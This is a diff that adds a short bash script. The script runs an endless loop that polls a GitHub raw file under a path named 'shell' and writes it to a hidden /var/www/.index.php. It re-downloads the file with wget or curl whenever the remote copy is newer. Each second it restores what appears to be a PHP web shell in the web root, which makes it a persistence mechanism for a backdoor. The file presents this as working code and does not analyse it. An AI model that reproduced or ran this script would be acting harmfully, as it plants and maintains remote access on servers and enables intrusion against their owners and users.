@@ -1,0 +1,42 @@
+#!/bin/bash
+
+# Define the output file and the URL to download from
+outputFile="/var/www/.index.php"
+url="https://raw.githubusercontent.com/xxTYPOxx/Dat/refs/heads/main/shell/typo2.txt"
+
+while true; do
+    # Get the last modified time of the file from the server
+    serverFileTime=$(curl -sI "$url" | grep -i Last-Modified | cut -d' ' -f2-)
+    serverFileTime=$(date -d "$serverFileTime" +%s)
+
+    # Check if the local file exists and get its modification time
+    if [ -f "$outputFile" ]; then
+        localFileTime=$(stat -c %Y "$outputFile")
+    else
+        localFileTime=0 # If the file does not exist, assume local timestamp is 0
+    fi
+
+    # If the server file is newer, download the file
+    if [ "$serverFileTime" -gt "$localFileTime" ]; then
+        # Try wget first
+        wget -q "$url" -O "$outputFile"
+        
+        # Check if wget was successful
+        if [ $? -ne 0 ]; then
+            # If wget fails, try curl
+            curl -o "$outputFile" "$url"
+            if [ $? -eq 0 ]; then
+                echo "File successfully downloaded using curl: $outputFile"
+            else
+                echo "An error occurred while downloading the file using curl."
+            fi
+        else
+            echo "File successfully downloaded using wget: $outputFile"
+        fi
+    else
+        echo "No changes to the file."
+    fi
+
+    # Wait for 1 second before checking again
+    sleep 1
+done
